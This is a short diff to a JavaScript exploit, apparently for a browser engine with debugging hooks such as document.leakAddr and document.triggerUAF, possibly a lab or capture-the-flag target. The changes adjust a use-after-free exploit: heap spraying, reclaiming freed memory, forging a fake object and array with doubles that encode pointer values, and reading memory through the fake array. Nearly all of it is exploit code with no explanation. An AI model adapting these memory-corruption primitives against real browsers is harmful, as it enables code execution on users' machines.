@@ -11,7 +11,7 @@ class X {
 	this.e = 5,
 	this.f = 6,
 	this.g = 7,
-	this.h = 3.54484805889626e-310,
+	this.h = 8,
 	this.i = arr,
 	this.j = 10,
 	this.k = 11,
@@ -56,7 +56,7 @@ function callback(ev) {
     for (let i = 0; i < 2; ++i)
         spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});
     let dummy = {a: 1, b: 2, c: 3, d: 4, e: 5};
-    let fake_obj = {a: 1, b: 2, c: 3, d: 4, e: 5};
+    let fake_obj = {12: "a", b: 2, c: 3, d: 4, e: 5, f: 6, g: 7};
     reclaim_obj.a = fake_obj;
     // document.leakAddr(reclaim_obj);
     // document.leakAddr(fake_obj);
@@ -66,18 +66,16 @@ function callback(ev) {
     reclaim_obj = undefined;
     gc();
 
+    let fake_arr = worker.a;
     var overwrite_obj = new X([1.1, 2.2]);
-    overwrite_obj.g = 6.867467956906379e-304;
-    var fake_buffer = new X([]);
-    overwrite_obj.i = fake_buffer;
-    fake_buffer.c = 1.946939626193801e-308;
-    fake_buffer.a = overwrite_obj;
-    fake_buffer.b = 0;
+    overwrite_obj.g = 6.85681541581055e-304;
+    overwrite_obj.h = fake_arr;
     document.leakAddr(overwrite_obj);
     document.leakAddr(worker.a);
-    var tmp = new Int32Array(worker.a, 0, 100);
-    document.triggerUAF(tmp);
-    // Array.prototype.concat.call([], worker.a);
+    document.leakAddr(fake_arr);
+ 
+    alert(fake_arr[12]);
+
     while (true) {}
 }
 
